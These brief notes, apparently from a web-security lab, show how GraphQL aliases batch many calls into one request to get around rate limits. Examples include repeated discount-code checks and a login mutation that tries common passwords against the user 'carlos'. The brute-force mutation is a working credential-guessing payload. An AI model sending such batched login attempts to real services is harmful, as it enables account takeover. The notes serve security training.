# Aliases and Rate-Limit Testing

## Simplified source example

```graphql
query isValidDiscount($code: Int) {
    isValidDiscount(code:$code){
        valid
    }
    isValidDiscount2:isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3:isValidDiscount(code:$code){
        valid
    }
}
```

## Login-alias structure

```graphql
mutation {
    bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }
    bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }
}
```

The complete password-generation helper from the source is preserved in the original-content file and should be treated as lab-only material.
